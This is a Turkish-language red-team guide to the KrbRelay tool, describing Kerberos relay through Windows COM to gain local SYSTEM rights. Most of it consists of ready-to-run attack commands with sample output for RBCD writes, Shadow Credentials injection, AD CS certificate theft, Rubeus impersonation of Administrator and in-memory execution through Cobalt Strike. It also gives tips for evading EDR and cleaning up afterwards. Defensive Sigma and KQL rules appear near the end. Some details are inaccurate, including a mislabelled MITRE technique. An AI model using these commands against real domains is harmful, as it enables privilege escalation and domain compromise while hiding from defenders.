# KrbRelay

> **Kategori:** [5. NTLM ve Kerberos Relay Motorları](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows ortamlarında çalışan yüksek yetkili sistem servislerini (SYSTEM / Network Service) COM/RPC arayüzleri üzerinden sahte veya hedef SPN'lere Kerberos kimlik doğrulaması (AP-REQ) yapmaya zorlayan ve bu biletleri yerel/uzak LDAP, HTTP veya RPC servislerine aktararak doğrudan LPE ve RBCD sağlayan C# tabanlı Kerberos relay motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory ve Windows kimlik doğrulama mimarisinde Kerberos, NTLM'in taşıdığı yapısal zafiyetlere (özellikle ortadaki adam ve relay saldırılarına) karşı en güvenli alternatif olarak konumlandırılmıştır. Klasik siber güvenlik kabullerine göre bir Kerberos bileti (`KRB_AP_REQ`), hedef servisin uzun vadeli gizli anahtarı ile şifrelenen bir Hizmet Bileti (Ticket / TGS) ve istemci tarafından üretilen anlık bir Doğrulayıcı (Authenticator) içerir. Doğrulayıcı paketi, istemci ile hedef servis arasındaki Oturum Anahtarı (Session Key) ile imzalandığı için biletin başka bir servise iletilmesinin imkansız olduğu varsayılmıştır.

Ancak James Forshaw, Dirk-jan Mollema ve Elad Shamir tarafından yapılan araştırmalar; Windows Component Object Model (COM) ve Uzaktan Yordam Çağrısı (RPC) altyapısının istemci tarafında kritik bir tasarım boşluğu barındırdığını kanıtlamıştır. Bir DCOM veya RPC istemcisi bir sunucuya bağlanırken, bağlanacağı hedef sunucunun Service Principal Name (SPN) değerini belirleme hakkını çağrıyı yapan veya aracı olan koda devreder. **`KrbRelay`** (Cube0x0 tarafından geliştirilen), bu mimari boşluğu istismar ederek yerel `NT AUTHORITY\SYSTEM` veya ayrıcalıklı servis hesaplarının Kerberos kimlik doğrulama paketlerini ele geçirip hedef servislere relay eden öncü bir sömürü aracıdır.

Araç, kurban COM istemcisini yerel bir TCP veya Named Pipe dinleyicisine yönlendirir. İstemci bu dinleyiciye bağlanırken, KrbRelay istemciye hedef olarak etki alanı denetleyicisinin LDAP servisini (örneğin `ldap/dc01.corp.local`) işaret eder. İstemci, Kerberos Dağıtım Merkezi'nden (KDC) bu SPN için geçerli bir TGS bileti talep eder ve AP-REQ paketini yerel dinleyiciye sunar. KrbRelay, bu paketi doğrudan DC'nin LDAP portuna (389 veya 636) iletir. Bilet doğrudan DC'nin makine hesabı sırlarıyla şifrelendiğinden, DC bileti başarıyla doğrular ve saldırgana SYSTEM haklarıyla LDAP üzerinde işlem yapma (RBCD yetkisi tanımlama veya Shadow Credentials anahtarı ekleme) yetkisi sunar.

### Mimari Akış Şeması

```
[ Kurban Yerel Servis (SYSTEM / DCOM Nesnesi) ]
       │
       │ (1) CLSID Tetikleme (CoGetInstanceFromFile / Storage Nesnesi)
       ▼
[ KrbRelay Yerel Dinleyici (127.0.0.1:Port / Named Pipe) ]
       │
       │ (2) İstemciye KDC'den Belirtilen SPN İçin Bilet İstetme
       │     (Hedef SPN: ldap/dc01.corp.local)
       ▼
[ KDC (Domain Controller:88) ]
       │
       │ (3) KDC'den Doğrulanmış Kerberos AP-REQ (TGS) Paketi Alınır
       ▼
[ KrbRelay Motoru ]
       │
       │ (4) AP-REQ Paketini Hedef Servise Anlık Olarak Relay Et
       ▼
[ Hedef Servis: LDAPS (DC:636) / HTTP (AD CS:80) ]
       │
       │ (5) Kimlik Doğrulama Başarılı! (Makine Hesabı Yetkileriyle)
       ▼
[ Sömürü Yükü: msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) ]
       │
[ Sonuç: Yerel Kullanıcıdan NT AUTHORITY\SYSTEM Seviyesine Yükselme ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **NTLM Kısıtlamalarını Aşma** | NTLM'in tamamen devre dışı bırakıldığı veya LDAP Signing/Channel Binding zorunlu ortamlarda dahi çalışır. | Modern ve sertleştirilmiş Active Directory ortamlarında yerel yetki yükseltme (LPE) sağlar. |
| **COM Nesnesi Manipülasyonu** | Farklı CLSID değerleri kullanarak Windows 10, 11 ve Server sürümlerinde SYSTEM tetikleme esnekliği sunar. | Güncel Windows sürümlerinde Potato türevi NTLM kısıtlamalarını atlar. |
| **Doğrudan RBCD ve Shadow Creds** | Hedef LDAP servisine anında `msDS-AllowedToActOnBehalfOfOtherIdentity` yazar veya KeyCredentialLink ekler. | Ağ trafiği üretmeden yerel konsoldan tam etki alanı/makine yetkisi sağlar. |
| **In-Memory Çalışma Desteği** | Saf C# (.NET) ile yazıldığından `execute-assembly` ile bellekte çalıştırılabilir. | Diske dosya bırakmadan EDR atlatma kolaylığı sağlar. |
| **Oturum Anahtarı Çözümü** | Kerberos AP-REQ paketlerini hedef protokole göre yeniden yapılandırarak şifreli doğrulama tüneli kurar. | Gelişmiş güvenlik duvarı arkasındaki DC'lere karşı yerel host üzerinden atlama tahtası oluşturur. |

### Karşılaştırma Tablosu

| Kriter | KrbRelay | impacket-ntlmrelayx | JuicyPotato / SweetPotato | KrbRelayUp |
|---|---|---|---|---|
| **Kullanılan Protokol** | Kerberos (AP-REQ) | NTLM | NTLM (Oxid / DCOM) | Kerberos + S4U2Proxy |
| **Gereken Hak** | Standart Kullanıcı | Ağ Üzerinde MitM | `SeImpersonatePrivilege` | Standart Kullanıcı |
| **Çalışma Yeri** | Windows (Yerel Host) | Linux (Ağ Üzeri) | Windows (Yerel Host) | Windows (Yerel Host) |
| **Sertleştirme Dayanıklılığı** | Yüksek (Kerberos tabanlı) | Orta (SMB/LDAP signing takılır) | Düşük (DCOM yamalandı) | Yüksek (Zincirleme LPE) |
| **Etki Alanı Hesabı Şartı** | Evet (SPN çözümü için) | Hayır (Hash yakalama yeterli) | Hayır (Yerel token) | Evet (RBCD için) |
| **Otomasyon Seviyesi** | Modüler (Rubeus gerekebilir) | Otomatik | Otomatik (SYSTEM Token) | Tam Otomatik (Tek Komut) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
KrbRelay.exe -spn <HEDEF_SPN> [SEÇENEKLER]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-spn <değer>` | Kurban servisin bilet talep edeceği hedef Service Principal Name (Zorunlu). | `ldap/dc01.corp.local` |
| `-clsid <GUID>` | İstemciyi tetiklemek için kullanılacak DCOM nesnesinin CLSID değeri. | `{90f18417-f0f1-484e-9d3c-59dceee5dbd8}` |
| `-target <host>` | Yakalanan Kerberos biletinin iletileceği hedef sunucunun FQDN veya IP adresi. | `dc01.corp.local` |
| `-port <sayı>` | KrbRelay dinleyicisinin yerel olarak bağlandığı TCP portu (Varsayılan rastgele). | `-port 12345` |
| `-endpoint <ad>` | Özel RPC uç noktası veya Named Pipe adı. | `-endpoint Default` |
| `-rbcd <hesap>` | Hedef LDAP üzerinde belirtilen makine/kullanıcı hesabına RBCD izni tanımlar. | `-rbcd ATTACKERPC$` |
| `-shadow` | Hedef makine nesnesine Shadow Credentials (yeni genel anahtar) enjekte eder. | Bayrak |
| `-user <ad>` | `--shadow` veya LDAP sorgularında hedeflenecek makine/kullanıcı adı. | `-user TARGETPC$` |
| `-adcs <url>` | AD CS Web Enrollment arayüzüne Kerberos bileti aktarır (ESC8). | `http://ca.corp.local/certsrv/` |
| `-template <ad>` | AD CS relay sırasında talep edilecek şablon. | `-template Machine` |
| `-domain <ad>` | Etki alanı FQDN adı (Otomatik tespit edilemezse belirtilir). | `-domain corp.local` |
| `-dc <ip/fqdn>` | Hedef etki alanı denetleyicisinin IP veya sunucu adı. | `-dc 192.168.1.10` |
| `-attacks` | Kullanılabilir LDAP sömürü modüllerini listeler (rbcd, shadow, user). | Bayrak |
| `-force` | Çakışan yerel portları veya aktif oturumları zorla temizleyerek başlatır. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kullanıcı Olarak Yerel Makine Hesabı Üzerinde RBCD Yapılandırma

Yerel bir iş istasyonunda düşük yetkili kullanıcı oturumundayken (`lowpriv`), yerel `SYSTEM` hesabı KrbRelay ile tetiklenir ve etki alanı denetleyicisinin LDAP servisine relay edilir. Kontrolümüz altındaki `EVILPC$` hesabına yerel makine için RBCD yetkisi yazılır.

```cmd
:: 1. KrbRelay ile yerel SYSTEM biletini DC'ye relay edip RBCD enjekte edin
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd EVILPC$
```

**KrbRelay Konsol Çıktısı Analizi:**

```text
[+] Initializing KrbRelay by @Cube0x0
[+] Targeting SPN: ldap/dc01.corp.local
[+] Using CLSID: {90f18417-f0f1-484e-9d3c-59dceee5dbd8}
[+] Starting local RPC/COM listener on 127.0.0.1:1337...
[+] Forcing SYSTEM account authentication via DCOM storage activation...
[*] Received Kerberos AP-REQ connection from NT AUTHORITY\SYSTEM (Account: WORKSTATION01$)!
[+] Extracted Kerberos AP-REQ ticket for ldap/dc01.corp.local!
[+] Connecting to target LDAP server: dc01.corp.local:389...
[+] Relaying Kerberos authentication token to LDAP...
[+] Authentication as WORKSTATION01$ successful against LDAP!
[*] Looking up object WORKSTATION01$ in directory...
[*] Looking up attacker computer account: EVILPC$...
[*] Modifying msDS-AllowedToActOnBehalfOfOtherIdentity for WORKSTATION01$...
[+] msDS-AllowedToActOnBehalfOfOtherIdentity successfully configured!
[+] Attack completed. Now request a service ticket via S4U2Proxy using Rubeus!
```

```cmd
:: 2. S4U2Proxy ile yerel makine için SYSTEM bileti üretip oturuma enjekte edin
Rubeus.exe s4u /user:EVILPC$ /rc4:E1A96394AA6F5B407C3DF50F2D398865 /impersonateuser:Administrator /msdsspn:cifs/workstation01.corp.local /ptt
```

---

### Senaryo 2: Shadow Credentials (msDS-KeyCredentialLink) İstismarı

Etki alanında makine hesabı oluşturma kotası (MachineAccountQuota) sıfır (`MAQ=0`) olduğunda veya RBCD yerine modern anahtar enjeksiyonu tercih edildiğinde, kurban makine nesnesine doğrudan X.509 anahtar bağı eklenir.

```cmd
:: KrbRelay ile Shadow Credentials anahtarı ekleyin
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -shadow -user WORKSTATION01$
```

**Konsol Çıktısı:**

```text
[+] Relay successful against ldap/dc01.corp.local as WORKSTATION01$
[+] Generating RSA 2048-bit keypair...
[+] Exporting public key to raw DER format
[+] Crafting KeyCredential JSON blob (DeviceId, KeyMaterial, KeyUsage: NGC)...
[+] Appending msDS-KeyCredentialLink to object CN=WORKSTATION01,OU=Computers,DC=corp,DC=local
[+] Successfully written msDS-KeyCredentialLink!
[+] Private Key saved to: C:\Users\Public\workstation01.key
[+] Run PKINIT / Whisker to obtain TGT for WORKSTATION01$:
    Rubeus.exe asktgt /user:WORKSTATION01$ /certificate:C:\Users\Public\workstation01.key /password:... /ptt
```

---

### Senaryo 3: AD CS Web Enrollment HTTP Arayüzüne Kerberos Relay (ESC8)

LDAP portlarında sıkı imzalama veya kanal bağlama olduğu durumlarda, bilet Active Directory Certificate Services Web Enrollment servisine yönlendirilir.

```cmd
KrbRelay.exe -spn http/ca01.corp.local -adcs http://ca01.corp.local/certsrv/certfnsh.asp -template Machine
```

**Konsol Çıktısı:**

```text
[+] Starting local RPC/COM listener on 127.0.0.1:4488...
[+] Forcing SYSTEM account authentication...
[*] Received Kerberos AP-REQ connection from NT AUTHORITY\SYSTEM!
[+] Relaying Kerberos token to HTTP http://ca01.corp.local/certsrv/certfnsh.asp...
[+] Authentication as WORKSTATION01$ successful!
[+] Submitting CSR for template 'Machine'...
[+] Certificate issued successfully!
[+] Base64 PFX written to: C:\Users\Public\cert.pfx
```

---

### Senaryo 4: Cobalt Strike Üzerinden Bellekte (In-Memory) KrbRelay Çalıştırma

Diske herhangi bir dosya yazmadan doğrudan Beacon komut satırından `execute-assembly` ile relay saldırısı gerçekleştirilir.

```text
beacon> execute-assembly C:\Tools\KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd COMPROMISED_BOX$
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KRB_AP_ERR_MODIFIED (41)` | Biletin şifrelendiği servis anahtarı ile hedef servisin anahtarı uyuşmuyor (Hedef SPN yanlış). | `-spn` parametresine hedef DC'nin tam FQDN adını (`ldap/dc01.corp.local`) girdiğinizden emin olun, IP adresi kullanmayın. |
| `CLSID instantiation failed (0x80040154)` | Belirtilen CLSID mevcut Windows derlemesinde veya işletim sistemi sürümünde kayıtlı değil. | Alternatif DCOM CLSID değerlerini deneyin (`Ole32`, `Shell.Application`, veya `KrbRelay` dahili CLSID tarayıcısını kullanın). |
| `LDAP error 80090308 (SecPkgContext_Bindings mismatch)` | Hedef Domain Controller üzerinde LDAP Channel Binding Token (CBT) ve Kerberos EPA zorunludur. | Hedef portu 389 olarak deneyin veya CBT koruması olmayan başka bir DC / RPC servisine relay yapın. |
| `Access Denied when modifying msDS-AllowedToActOnBehalfOfOtherIdentity` | Hedef makine nesnesinde yazma hakkı kısıtlanmış veya relay edilen hesap yeterli ACL iznine sahip değil. | KrbRelay'i `-shadow` bayrağı ile çalıştırarak `msDS-KeyCredentialLink` özniteliğini hedefleyin. |
| `Failed to bind to local port / Address in use` | Belirtilen veya varsayılan port başka bir yerel servis tarafından dinleniyor. | `-port 54321` gibi rastgele yüksek bir port tanımlayın veya `-force` bayrağını kullanın. |
| `KDC_ERR_ETYPE_NOSUPP (14)` | Hedef sistem ile KDC arasında Kerberos şifreleme türü uyuşmazlığı (RC4 vs AES128/AES256). | Etki alanında AES şifreleme desteğini kontrol edin; `-spn` için FQDN kullanarak biletin AES ile üretilmesini sağlayın. |
| `CO_E_NOTINITIALIZED / RPC_S_SERVER_UNAVAILABLE` | Yerel DCOM/RPC altyapısı meşgul veya çağrı yapılan COM arabirimi başlatılamadı. | Farklı bir CLSID sınıfı seçin veya işlemi yeni bir PowerShell/CMD bağlamında tekrar başlatın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK-ORTA (YEREL COM & KERBEROS LOGLARI)
──────────────────────────────────────────────────────────────────
[ Ağ Trafiği ]      : Ağda yalnızca standart Kerberos TGS isteği (KDC:88)
[ Windows Logları ] : Event ID 4769 (TGS Request), Event ID 4738 (RBCD yazma)
[ EDR / AV ]        : CLSID COM arayüzü tetikleme, bellek içi .NET çalıştırma
[ Sysmon ]          : Event ID 1 (Process Creation), Event ID 17/18 (Named Pipes)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4769 (Kerberos Ticket Operations):**
   - İstemci makine hesabının (`WORKSTATION01$`) talep ettiği `ServiceName` değeri `ldap/dc01.corp.local` olarak kaydedilir.
   - Normal şartlarda iş istasyonlarının LDAP servisi için Kerberos bileti istemesi olağan karşılansa da, talebin hemen ardından gelen nesne düzenlemeleri alarm sebebidir.
2. **Windows Security Event ID 4738 (A user/computer account was modified):**
   - Kurban makine nesnesinde `msDS-AllowedToActOnBehalfOfOtherIdentity` veya `msDS-KeyCredentialLink` alanının güncellendiği kaydedilir.
3. **Sysmon Event ID 1 & 10 (Process Creation / Process Access):**
   - Standart bir kullanıcı sürecinin (örneğin Beacon veya PowerShell) DCOM/COM sunucularını başlatması ve RPC uç noktalarına bağlanması davranışsal anomalidir.
4. **Sysmon Event ID 17 & 18 (Pipe Created / Pipe Connected):**
   - KrbRelay yerel named pipe uç noktaları kullandığında dinamik boru adları kaydedilir.

### 5.2 Ağ ve EDR İmzaları

- **NTLM Trafiği Yoktur:** Ağ üzerinde hiçbir NTLM challenge-response paketi üretilmez; bu sayede klasik NTLM relay tespit mekanizmaları tamamen kör kalır.
- **RPC Endpoint Gürültüsü:** KrbRelay yerel bir RPC sunucusu ayağa kaldırıp COM istemcisini bu porta bağladığı için yerel host bazlı EDR ağ dinleme kuralları devreye girebilir.
- **AMSI ve .NET Yüklemesi:** `execute-assembly` kullanılırken `CLR.dll` yüklenmesi ve AMSI bellek taraması tetiklenebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.003** | Subverting Trust: Kerberos Ticket Manipulation | Yerel AP-REQ paketini yakalayıp LDAP servisine relay etme. |
| **T1068** | Exploitation for Privilege Escalation | COM/DCOM tasarım boşluğunu kullanarak yerel SYSTEM haklarına ulaşma. |
| **T1557.001** | Adversary-in-the-Middle | Yerel RPC trafiğini araya girerek yönlendirme. |
| **T1078.002** | Valid Accounts: Domain Accounts | Hedef sistemde meşru makine hesabının biletini kötüye kullanma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Derlenmiş İkili (EXE) İmzası** | `KrbRelay.exe` popüler EDR'lar tarafından imza bazlı yakalanır. Kaynak kodu derlerken değişken ve fonksiyon adlarını gizleyin (Obfuscation). |
| **CLSID Çağrısı Anomalisi** | Bilinen bayat CLSID'ler EDR'ların dikkatini çeker; sistemde yüklü olan ve az kullanılan meşru COM nesnelerini tercih edin. |
| **Kalıcı RBCD Özniteliği** | S4U2Proxy ile yönetimsel bilet elde edildikten sonra kurban makinenin `msDS-AllowedToAct` özniteliğini derhal temizleyin. |
| **Named Pipe İmzaları** | Dinleyici için rastgele veya Windows varsayılanlarına benzer isimler tanımlayın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — KrbRelay Kaynaklı Şüpheli msDS-AllowedToAct Manipülasyonu:**

```yaml
title: Potential Kerberos Relay via Local COM Abuse
status: experimental
description: Detects computer accounts modifying their own or other computer delegation attributes.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4738
    AttributeLDAPDisplayName: 'msDS-AllowedToActOnBehalfOfOtherIdentity'
  filter:
    SubjectUserName|endswith: '$'
  condition: selection and filter
level: high
```

**Microsoft Sentinel (KQL) — Makine Hesabı Tarafından Yapılan Kritik Öznitelik Değişikliği:**

```kql
SecurityEvent
| where EventID == 4738
| where AttributeName in ("msDS-AllowedToActOnBehalfOfOtherIdentity", "msDS-KeyCredentialLink")
| where SubjectAccount matches regex @"\$$"
| project TimeGenerated, Computer, SubjectAccount, TargetAccount, AttributeName
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart CLSID ile LDAP Üzerinde RBCD Yapılandırma
```cmd
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd ATTACKER_BOX$
```
- **Ne Yapar?** Yerel SYSTEM hesabını tetikleyerek etki alanı denetleyicisinin LDAP servisine Kerberos bileti göndermesini sağlar ve yerel makine üzerinde `ATTACKER_BOX$` hesabına RBCD izni yazar.
- **Ne Zaman Kullanılır?** Düşük yetkili yerel kullanıcıdan makine üzerinde SYSTEM haklarına yükselmek istendiğinde.
- **Parametreler:** `-spn`: Hedef LDAP FQDN, `-clsid`: Kurban COM arayüzü, `-rbcd`: Yetki verilecek bilgisayar hesabı.

### Komut 2: Shadow Credentials (KeyCredentialLink) Enjeksiyonu
```cmd
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -shadow -user WORKSTATION01$
```
- **Ne Yapar?** Makine kotası aşıldığında veya yeni bilgisayar hesabı eklenemediğinde, kurban makinenin LDAP nesnesine doğrudan X.509 genel anahtarı yazar.
- **Ne Zaman Kullanılır?** `MAQ=0` olan sıkılaştırılmış ortamlarda PKINIT üzerinden TGT almak için.
- **Parametreler:** `-shadow`: Gölge kimlik modu, `-user`: Hedef makine hesabı adı.

### Komut 3: Özel Port Üzerinde RPC Dinleyicisi Başlatma
```cmd
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -port 49999 -rbcd EVIL$
```
- **Ne Yapar?** Yerel dinleyiciyi rastgele veya belirtilen yüksek numaralı bir TCP portuna bağlar; port çakışmalarını önler.
- **Ne Zaman Kullanılır?** Varsayılan veya popüler portlar güvenlik yazılımları tarafından kısıtlandığında.
- **Parametreler:** `-port`: Yerel dinleyici port numarası.

### Komut 4: AD CS Web Enrollment Üzerinden Sertifika Çekme (ESC8)
```cmd
KrbRelay.exe -spn http/ca.corp.local -adcs http://ca.corp.local/certsrv/certfnsh.asp -template Machine
```
- **Ne Yapar?** Kerberos biletini sertifika otoritesinin HTTP arayüzüne relay ederek kurban makine adına geçerli bir kimlik doğrulama sertifikası üretir.
- **Ne Zaman Kullanılır?** LDAP Signing zorunlu ancak CA Web Enrollment HTTP arayüzü aktif olduğunda.
- **Parametreler:** `-adcs`: Hedef CA kayıt URL'si, `-template`: Sertifika şablonu.

### Komut 5: Cobalt Strike Beacon İçinden Çalıştırma
```text
beacon> execute-assembly C:\Tools\KrbRelay.exe -spn ldap/dc.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd PIVOTPC$
```
- **Ne Yapar?** Aracı yerel diske bırakmadan doğrudan bellek içinde çalıştırır; hedef nesneye RBCD ekler.
- **Ne Zaman Kullanılır?** EDR'ların disk tarama motorlarını atlatmak için kırmızı takım operasyonlarında.
- **Parametreler:** Cobalt Strike dahili `execute-assembly` motoru.

### Komut 6: Alternatif CLSID (Task Scheduler / BITS) Kullanarak Tetikleme
```cmd
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {4f32d5f0-bd3e-11d1-bb21-00c04fa30080} -rbcd ATTACKER$
```
- **Ne Yapar?** Standart DCOM CLSID'si engellenmiş veya yamalanmış sistemlerde alternatif Windows servis CLSID'lerini istismar eder.
- **Ne Zaman Kullanılır?** Varsayılan CLSID çalıştığında `0x80040154` veya `Access Denied` hatası alındığında.
- **Parametreler:** `-clsid`: Alternatif Windows COM sınıf tanıtıcısı.

### Komut 7: Belirli DC Belirterek Kerberos Relay Çalıştırma
```cmd
KrbRelay.exe -spn ldap/dc02.corp.local -dc 192.168.1.12 -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd EVILPC$
```
- **Ne Yapar?** DNS çözümleme yapmadan doğrudan belirtilen etki alanı denetleyicisi IP'sine LDAP Kerberos oturumunu yönlendirir.
- **Ne Zaman Kullanılır?** Yerel makinede DNS çözümleme sorunları veya birden çok etki alanı denetleyicisi olduğunda.
- **Parametreler:** `-dc`: Hedef etki alanı denetleyicisi IP adresi.

### Komut 8: Port Çakışmasını Zorla Aşarak Çalıştırma
```cmd
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd EVIL$ -force
```
- **Ne Yapar?** Yerel dinleyici soketlerinde önceki oturumlardan kalan kilitlenmeleri temizleyerek dinleyiciyi ayağa kaldırır.
- **Ne Zaman Kullanılır?** Önceki başarısız denemelerden sonra `Address in use` hatası alındığında.
- **Parametreler:** `-force`: Soket ve bağlam zorlama bayrağı.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Cube0x0 / KrbRelay](https://github.com/Cube0x0/KrbRelay)
- **Dirk-jan Mollema Araştırması:** [Relaying Kerberos - Having fun with unconstrained delegation and SPNs](https://dirkjanm.io/)
- **James Forshaw Araştırması:** [Bypassing Kerberos Delegation Protections via COM](https://www.tiraniddo.dev/)
- **Elad Shamir Araştırması:** [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://posts.specterops.io/wagging-the-dog-abusing-resource-based-constrained-delegation-a313e68b35c0)

---

> **Önceki:** [← impacket-ntlmrelayx](./impacket-ntlmrelayx.md) · **Sonraki:** [KrbRelayUp →](./KrbRelayUp.md)
